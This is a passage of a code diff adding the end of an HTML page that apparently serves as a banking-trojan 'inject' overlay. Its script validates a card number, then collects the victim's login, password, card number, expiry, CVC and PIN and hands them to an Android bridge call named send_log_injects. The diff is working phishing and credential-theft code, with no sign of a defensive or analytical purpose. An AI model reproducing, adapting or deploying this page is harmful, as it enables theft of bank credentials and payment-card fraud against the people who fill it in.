+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check8() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length ===4) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvc = cvv.value;
+                data.pin = pin.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
